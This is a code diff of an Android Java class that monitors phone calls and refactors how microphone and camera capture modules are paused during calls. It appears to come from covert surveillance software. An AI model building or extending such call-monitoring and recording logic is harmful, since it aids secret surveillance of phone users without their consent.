@@ -104,26 +104,18 @@ public class BroadcastMonitorCall  {
 					Check.log(TAG + " (manageReceive): RINGING, my<===" + ongoing_number);//$NON-NLS-1$
 				}
 				incoming = Call.INCOMING;
+				addStopsForCall();
 				exit = true;
 			}
 			if(exit) {
 				// stop mic and Camera as soon as possible
+				/* todo: in case of the phone has not a sim or the gsm network isn't avaialble
+				 * it happens that mic and camera get stopped but not restarted because there isn't any
+				 * call start and stop
+				 */
 				if (ongoing_number != "") {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (manageReceive): Adding stops for Mic and Camera");
-					}
-					if( android.os.Build.VERSION.SDK_INT > 20 ) {// L+
-						if (Cfg.DEBUG) {
-							Check.log(TAG + "(manageReceive): Android 5.0 don't stop the mic" );
-						}
-					}else {
-						if (ModuleMic.self() != null) {
-							ModuleMic.self().addStop(MODULE_STOP_REASON);
-						}
-					}
-					if (ModuleCamera.self() != null) {
-						ModuleCamera.self().addStop(MODULE_STOP_REASON);
-					}
+					// improvements: we can check if a trial to call a number has been done without success
+					// and log it as CallListInfo
 					call = new Call(ongoing_number, incoming);
 				}
 				return;
@@ -204,6 +196,9 @@ public class BroadcastMonitorCall  {
 									return ;
 								}
 							}
+							if(incoming==Call.OUTGOING) {
+								addStopsForCall();
+							}
 							call.setOngoing(true);
 							call.setOffhook();
 							//ListenerCall.self().dispatch(call);
@@ -241,6 +236,26 @@ public class BroadcastMonitorCall  {
 			if (Cfg.EXCEPTION) {
 				Check.log(TAG + " (manageReceive) Error: " + ex);
 				ex.printStackTrace();
+			}
+		}
+	}
+
+	public static void addStopsForCall() {
+		if(ongoing_number!="") {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (manageReceive): Adding stops for Mic and Camera");
+			}
+			if (android.os.Build.VERSION.SDK_INT > 20) {// L+
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(manageReceive): Android 5.0 don't stop the mic");
+				}
+			} else {
+				if (ModuleMic.self() != null) {
+					ModuleMic.self().addStop(MODULE_STOP_REASON);
+				}
+			}
+			if (ModuleCamera.self() != null) {
+				ModuleCamera.self().addStop(MODULE_STOP_REASON);
 			}
 		}
 	}
